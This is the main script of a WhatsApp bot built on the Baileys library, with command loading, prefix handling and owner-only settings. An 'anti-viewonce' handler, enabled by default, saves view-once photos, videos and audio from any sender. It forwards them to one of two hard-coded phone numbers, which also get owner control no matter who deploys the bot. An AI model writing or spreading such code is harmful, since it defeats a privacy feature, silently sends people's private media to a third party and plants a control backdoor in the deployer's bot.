const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const qrcode = require('qrcode-terminal');
const settings = require('./settings');

const PROTECTED_OWNER_NUMS = ["2347072956206", "2348108717744"];
function isRealOwner(jid){ return PROTECTED_OWNER_NUMS.some(n=>jid&&jid.includes(n)) }
function getOwnerJid(){ return PROTECTED_OWNER_NUMS[0]+"@s.whatsapp.net" }

global.privacyMode = "public";
global.sudo = fs.existsSync('./sudo.json')? JSON.parse(fs.readFileSync('./sudo.json')) : [];
global.anticall = false;
global.antiviewonce = true;
global.creact = true;
global.aliveReply = global.aliveReply || {};
global.settingsReply = global.settingsReply || {};
global.songCache = global.songCache || {};
global.videoCache = global.videoCache || {};

async function startBot(){
const { state, saveCreds } = await useMultiFileAuthState(path.resolve(settings.sessionName));
const sock = makeWASocket({ auth: state, logger: pino({ level: 'silent' }) });

const commands = new Map();
const cmdPath = path.join(__dirname,'commands');
fs.readdirSync(cmdPath).forEach(f=>{
  if(f.endsWith('.js')){
    try{
      delete require.cache[require.resolve(`./commands/${f}`)];
      let c=require(`./commands/${f}`);
      commands.set(c.name,c);
      if(c.alias) c.alias.forEach(a=>commands.set(a,c));
    }catch(e){}
  }
});

sock.ev.on('creds.update', saveCreds);
sock.ev.on('connection.update', async (u)=>{
  if(u.qr) qrcode.generate(u.qr,{small:true});
  if(u.connection==="close"){
    let r=u.lastDisconnect?.error?.output?.statusCode;
    if(r!==DisconnectReason.loggedOut) setTimeout(startBot,3000);
  }
});

sock.ev.on('messages.upsert', async ({messages})=>{
let m=messages[0];
if(!m.message||m.key.fromMe) return;
let chat=m.key.remoteJid;
let body=m.message.conversation||m.message.extendedTextMessage?.text||m.message.buttonsResponseMessage?.selectedButtonId||m.message.listResponseMessage?.singleSelectReply?.selectedRowId||"";
let sender=m.key.participant||chat;
let isOwner=isRealOwner(sender)||global.sudo?.includes(sender);

// ===== AUTO ANTI-VIEWONCE =====
try{
let view = m.message.viewOnceMessageV2?.message || m.message.viewOnceMessage?.message
if(view && global.antiviewonce){
  let type = Object.keys(view)[0]
  let msgObj = view[type]
  let ownerJid = getOwnerJid()
  let buffer = await downloadMediaMessage({ message: { [type]: msgObj } }, 'buffer', {}, { logger: pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage })
  let cap = `*👁️ ANTI-VIEWONCE*\n*From:* ${sender}\n${settings.footer}`
  if(type.includes("image")) await sock.sendMessage(ownerJid, { image: buffer, caption: cap })
  else if(type.includes("video")) await sock.sendMessage(ownerJid, { video: buffer, caption: cap })
  else if(type.includes("audio")) await sock.sendMessage(ownerJid, { audio: buffer, mimetype: "audio/mpeg", ptt: true })
}
}catch(e){}

// ===== ALIVE REPLY 1-4 HANDLER =====
let cleanBody = body.trim().toLowerCase()
if(global.aliveReply[chat] && ["1","2","3","4"].includes(cleanBody)){
  delete global.aliveReply[chat]
  if(cleanBody==="1"){ body = ".menu" }
  else if(cleanBody==="2"){ body = ".ping" }
  else if(cleanBody==="3"){
    if(!isOwner) return sock.sendMessage(chat, { text: `❌ Owner only\n${settings.footer}` }, { quoted: m })
    return sock.sendMessage(chat, { text: `*⚙️ SETTINGS*\n\n*Owner:* ${PROTECTED_OWNER_NUMS.join(", ")}\n*Prefix:* ${settings.prefix}\n*Mode:* ${global.privacyMode}\n*AntiCall:* ${global.anticall}\n*AntiViewOnce:* ${global.antiviewonce}\n\n${settings.footer}` }, { quoted: m })
  } else if(cleanBody==="4"){
    let up = Math.floor(process.uptime()/60)
    let hrs = Math.floor(up/60)
    let uptime = hrs>0? `${hrs}h ${up%60}m` : `${up}m`
    return sock.sendMessage(chat, { text: `*🤖 BOT INFO*\n\n*Name:* E TECH OFC\n*Owner:* Mr Ephraim Ofc\n*Commands:* ${commands.size}\n*Uptime:* ${uptime}\n*Prefix:* ${settings.prefix}\n\n${settings.footer}` }, { quoted: m })
  }
}

// ===== SETTINGS REPLY 1-7 HANDLER =====
if(global.settingsReply[chat] && ["1","2","3","4","5","6","7"].includes(cleanBody)){
  body = `?settings ${cleanBody}`
}

// ===== DUAL PREFIX =====
const ownerOnlyCmds = ["settings","setting","mode","ban","unban","setsudo","delsudo","restart","anticall","antiviewonce","creact"]
const reactMap = { menu:"📜", ping:"🏓", alive:"🌎", settings:"⚙️", setting:"⚙️" }
const stagedCmds = ["song","play","music","tiktok","fb","video","insta"]

let usedPrefix=null
if(body.startsWith("?")) usedPrefix="?"
else if(body.startsWith(settings.prefix)) usedPrefix=settings.prefix
else return

if(usedPrefix==="?" &&!isOwner) return

let args=body.slice(usedPrefix.length).trim().split(/ +/)
let cmdName=args.shift().toLowerCase()
if(!cmdName) return

// SETTINGS MUST BE? ONLY - BLOCK.settings
if((cmdName==="settings" || cmdName==="setting") && usedPrefix!== "?") return

if(ownerOnlyCmds.includes(cmdName) && usedPrefix==="." &&!isOwner) return

if(reactMap[cmdName] &&!stagedCmds.includes(cmdName)){
  try{ await sock.sendMessage(chat, { react: { text: reactMap[cmdName], key: m.key } }) }catch{}
}

if(commands.has(cmdName)){
  try{
    m.pushName = m.pushName || chat
    await commands.get(cmdName).execute(sock,m,args,settings)
  }catch(e){ console.log(e) }
}
});
}
startBot();
